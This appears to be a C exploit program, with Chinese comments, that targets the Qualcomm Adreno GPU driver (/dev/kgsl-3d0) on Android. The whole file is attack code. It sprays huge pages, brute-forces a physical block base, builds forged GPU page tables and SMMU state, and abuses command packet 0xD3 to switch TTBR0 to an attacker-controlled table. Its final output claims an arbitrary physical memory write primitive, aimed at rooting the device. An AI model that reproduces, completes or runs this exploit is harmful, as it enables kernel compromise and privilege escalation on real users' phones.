/* kgsl_root2.c — 22-dword SMMU 状态构造 + 记录驱动 TTBR0 切换
 * 1. spray + 找块基 BLK0BASE(v5 探针)
 * 2. 块内构造: GPU 页表(VA 0x6000000000 → 块内 0x7000) + SMMU 状态(22d) + 记录字段
 * 3. 0xD3{rec=BLK0BASE} → handler 按记录编程 SMMU(TTBR0=我们的表) → marker 经新表落地验证
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <time.h>
#include "adrenaline.h"

#define BLOCK_SZ 0x200000UL
#define NBLOCKS 64
#define PTE_AF (1 << 6)
#define RECATTR 0

static int fd;
static uint64_t g_clsz;
static uint32_t *ib;
static uint64_t ib_ga;
static uint32_t ctx;
static uint8_t *blk[NBLOCKS];

static void cache_op(void *s, void *e, int inv) {
    s = (char*)((uintptr_t)s & ~(g_clsz - 1));
    for (; s < e; s += g_clsz) {
        if (inv) __asm volatile("dc civac, %0" : : "r" (s) : "memory");
        else     __asm volatile("dc cvac, %0"  : : "r" (s) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}
static double now_s(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}
static void ctx_create(void) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, _IOWR(0x09, 0x13, struct kgsl_drawctxt_create), &req);
    if (!r) ctx = req.drawctxt_id;
}
static void ctx_recreate(void) {
    ioctl(fd, _IOW(0x09, 0x14, struct kgsl_drawctxt_destroy),
          &(struct kgsl_drawctxt_destroy){ .drawctxt_id = ctx });
    ctx_create();
}
static int gpu_command(uint64_t gaddr, uint32_t size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = gaddr; c.size = size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    return ioctl(fd, _IOWR(0x09, 0x4A, struct kgsl_gpu_command), &req);
}
static uint64_t wait_ts(uint32_t ts, uint32_t timeout_ms) {
    struct { uint32_t context_id, timestamp, timeout; } w = { ctx, ts, timeout_ms };
    double t0 = now_s();
    ioctl(fd, _IOWR(0x09, 0x07, char[12]), &w);
    return (uint64_t)((now_s() - t0) * 1000);
}
static long thp_bytes_of(void *p) {
    FILE *f = fopen("/proc/self/smaps", "r");
    if (!f) return -1;
    char line[256];
    uintptr_t target = (uintptr_t)p;
    int in = 0; long thp = -1;
    while (fgets(line, sizeof(line), f)) {
        uintptr_t lo, hi;
        if (sscanf(line, "%lx-%lx", &lo, &hi) == 2) { in = (target >= lo && target < hi); if (in) thp = 0; }
        else if (in && !strncmp(line, "AnonHugePages:", 14)) sscanf(line + 14, "%ld", &thp);
    }
    fclose(f);
    return thp;
}
static int spray(void) {
    for (int j = 0; j < NBLOCKS; j++) {
        uint8_t *raw = mmap(NULL, BLOCK_SZ * 2, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (raw == MAP_FAILED) return 1;
        uint8_t *base = (uint8_t*)(((uintptr_t)raw + BLOCK_SZ - 1) & ~(BLOCK_SZ - 1));
        madvise(base, BLOCK_SZ, MADV_HUGEPAGE);
        memset(base, 0, BLOCK_SZ);
        blk[j] = base;
    }
    int ok = 0;
    for (int j = 0; j < NBLOCKS; j++)
        if (thp_bytes_of(blk[j]) >= (long)BLOCK_SZ / 1024) ok++;
    printf("[spray] THP %d/%d\n", ok, NBLOCKS);
    return ok == NBLOCKS ? 0 : 1;
}

/* v5 探针(找块基) */
static void fill_probe(uint64_t B) {
    uint64_t laf = 0x1 | (1 << 6) | (2 << 8) | (1 << 10);
    for (int j = 0; j < NBLOCKS; j++) {
        uint64_t *pg0 = (uint64_t*)blk[j];
        uint64_t *pg1 = (uint64_t*)(blk[j] + 0x1000);
        uint64_t *pg3 = (uint64_t*)(blk[j] + 0x3000);
        uint64_t *pg4 = (uint64_t*)(blk[j] + 0x4000);
        uint64_t *pg5 = (uint64_t*)(blk[j] + 0x5000);
        memset(blk[j], 0, 0x6000);
        pg0[0] = (B + 0x1000) | 3;
        pg0[1] = (B + 0x1000) | 3;
        pg0[0x100] = (B + 0x1000) | 3;
        pg1[0] = (B + 0x3000) | 3;
        pg1[0x100] = (B + 0x3000) | 3;
        pg1[1] = (B + 0x2000) | 3;
        pg1[2] = (B + 0x2000) | 3;
        pg3[0] = (B + 0x4000) | 3;
        for (int i = 1; i < 512; i++) pg3[i] = (B + 0x5000) | laf;
        for (int i = 0; i < 512; i++) pg4[i] = (B + 0x5000) | laf;
        for (int i = 0; i < 512; i++) pg5[i] = 0x80000000u;
        pg5[32] = 0x703D8003;
        pg5[33] = 0x00001090; pg5[34] = 0x00000040;
        pg5[35] = 0x41414141;
        pg5[500] = 0x703F0003; pg5[501] = 0x00001000;
        pg5[502] = 0x00000040; pg5[503] = 0x000001F8;
    }
    for (int j = 0; j < NBLOCKS; j++)
        cache_op(blk[j], blk[j] + 0x6000, 0);
}
static uint64_t find_base(uint64_t start, uint64_t count) {
    uint32_t ts = 0;
    for (uint64_t k = 0; k < count; k++) {
        uint64_t B = start + k * BLOCK_SZ;
        fill_probe(B);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(0xD3, 4);
        *c++ = lower_32_bits(B); *c++ = upper_32_bits(B);
        *c++ = 0; *c++ = 0;
        *c++ = cp_type7_packet(0x3f, 3);
        *c++ = 0x00001000; *c++ = 0x00000040;
        *c++ = 0x000001F8;
        uint32_t dw = (uint32_t)(c - ib);
        cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
        ts++;
        int r = gpu_command(ib_ga, dw * 4);
        if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
        wait_ts(ts, 3000);
        int hitb = -1;
        for (int j = 0; j < NBLOCKS && hitb < 0; j++) {
            cache_op(blk[j] + 0x5000, blk[j] + 0x5400, 1);
            uint32_t *w = (uint32_t*)(blk[j] + 0x5000);
            for (uint64_t o = 0; o < 0x400 / 4; o++)
                if (w[o] == 0x41414141u) { hitb = j; break; }
        }
        if (k % 256 == 0)
            printf("  [%7.1fs] %llu/%llu B=0x%llx hit=%d\n",
                   now_s(), (unsigned long long)k + 1, (unsigned long long)count,
                   (unsigned long long)B, hitb);
        if (hitb >= 0) {
            printf("*** 块基: B = 0x%llx (块 %d) ***\n", (unsigned long long)B, hitb);
            return B;
        }
        ctx_recreate();
    }
    return 0;
}

/* SMMU 状态(22 dwords)构造 */
static void build_smmu_state(uint32_t *st, uint64_t ttbr) {
    memset(st, 0, 22 * 4);
    st[0] = (uint32_t)(ttbr & 0xFFFFFFFF);        /* TTBR0 lo */
    st[1] = (uint32_t)(ttbr >> 32);                /* TTBR0 hi */
    /* [2..] 其余寄存器: 0(未知布局, 全 0 + TTBR0) */
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);
    fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return 1;
    ib = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    memset(ib, 0, 0x1000);
    struct kgsl_map_user_mem m;
    memset(&m, 0, sizeof(m));
    m.len = 0x1000; m.hostptr = (unsigned long)ib; m.memtype = KGSL_USER_MEM_TYPE_ADDR;
    if (ioctl(fd, _IOWR(0x09, 0x15, struct kgsl_map_user_mem), &m)) return 1;
    ib_ga = m.gpuaddr;
    printf("# ib_ga=0x%llx\n", (unsigned long long)ib_ga);
    if (spray()) return 1;
    ctx_create();

    uint64_t BLK0BASE = find_base(0x40000000ull, 7168);
    if (!BLK0BASE) { printf("no base\n"); return 1; }
    ctx_recreate();

    /* 构造: GPU 页表(块内 0x10000-0x13FFF): VA 0x6000000000 → phys BLK0BASE+0x7000 */
    printf("\n===== 构造页表 + SMMU 状态 + 记录 =====\n");
    uint64_t *L0 = (uint64_t*)(blk[0] + 0x10000);
    uint64_t *L1 = (uint64_t*)(blk[0] + 0x11000);
    uint64_t *L2 = (uint64_t*)(blk[0] + 0x12000);
    uint64_t *L3 = (uint64_t*)(blk[0] + 0x13000);
    memset(L0, 0, 0x4000);
    L0[0] = (BLK0BASE + 0x11000) | 3;
    L1[0x180] = (BLK0BASE + 0x12000) | 3;
    L2[0] = (BLK0BASE + 0x13000) | 3;
    L3[0] = (BLK0BASE + 0x7000) | 0x1 | PTE_AF | (2 << 8) | (RECATTR << 2);
    /* SMMU 状态(22 dwords) @ 块内 0x8000 (phys BLK0BASE+0x8000) */
    uint32_t st[22];
    build_smmu_state(st, BLK0BASE + 0x10000);   /* TTBR0 = 我们的表 */
    memcpy(blk[0] + 0x8000, st, 22 * 4);
    /* 记录字段: addrs(0x354/0x34c/0x344/0x33c/0x334) = 0x40008000(状态物理); counts(0x358/0x350/0x348/0x340/0x338/0x320) = 22 */
    uint32_t addrs[5] = { 0x354, 0x34c, 0x344, 0x33c, 0x334 };
    uint32_t counts[6] = { 0x358, 0x350, 0x348, 0x340, 0x338, 0x320 };
    for (int i = 0; i < 5; i++) *(uint32_t*)(blk[0] + addrs[i]) = 0x40008000u;
    for (int i = 0; i < 6; i++) *(uint32_t*)(blk[0] + counts[i]) = 22;
    /* +0x9a8 区(22 dwords) = SMMU 状态副本(mem-read 源) */
    memcpy(blk[0] + 0x9a8, st, 22 * 4);
    /* +0x688 区(0xc7 dwords)、+0x3c4 区(40 dwords) = SMMU 状态填充 */
    for (int i = 0; i < 0xc7; i++) *(uint32_t*)(blk[0] + 0x688 + i * 4) = st[i % 22];
    for (int i = 0; i < 40; i++) *(uint32_t*)(blk[0] + 0x3c4 + i * 4) = st[i % 22];
    cache_op(blk[0], blk[0] + BLOCK_SZ, 0);
    printf("记录+SMMU 状态就绪(TTBR0=0x%llx, 状态 phys=BLK0BASE+0x8000)\n", (unsigned long long)(BLK0BASE + 0x10000));

    /* 切换 + marker 验证 */
    printf("\n===== TTBR0 切换 + marker 验证 =====\n");
    memset(blk[0] + 0x7000, 0, 0x1000);
    cache_op(blk[0] + 0x7000, blk[0] + 0x8000, 0);
    uint32_t ts = 0;
    /* 批次 1: 切换 */
    uint32_t *c = ib;
    *c++ = cp_type7_packet(0xD3, 4);
    *c++ = (uint32_t)((BLK0BASE + 0x10000) & 0xFFFFFFFF); *c++ = 0;
    *c++ = 0x40000000;
    *c++ = 0;
    uint32_t dw = (uint32_t)(c - ib);
    cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
    ts++;
    int r = gpu_command(ib_ga, dw * 4);
    if (r) { ctx_recreate(); r = gpu_command(ib_ga, dw * 4); }
    uint64_t ms = wait_ts(ts, 6000);
    printf("批次1(切换): submit=%d 退役=%llums\n", r, (unsigned long long)ms);
    /* 批次 2: marker */
    c = ib;
    *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
    *c++ = 0x00000000; *c++ = 0x00000060;
    *c++ = 0x41414141;
    cache_op((uint8_t*)ib, (uint8_t*)ib + dw * 4, 0);
    ts++;
    r = gpu_command(ib_ga, 16);
    if (r) { ctx_recreate(); r = gpu_command(ib_ga, 16); }
    uint64_t ms2 = wait_ts(ts, 6000);
    printf("批次2(marker): submit=%d 退役=%llums\n", r, (unsigned long long)ms2);
    cache_op(blk[0] + 0x7000, blk[0] + 0x7004, 1);
    uint32_t got = *(uint32_t*)(blk[0] + 0x7000);
    printf("窗口 phys BLK0BASE+0x7000 = 0x%08x %s\n", got,
           got == 0x41414141 ? "<<< TTBR0 切换成功: 任意物理写原语成立!!!" : "(未落地)");
    printf("done alive\n");
    return 0;
}
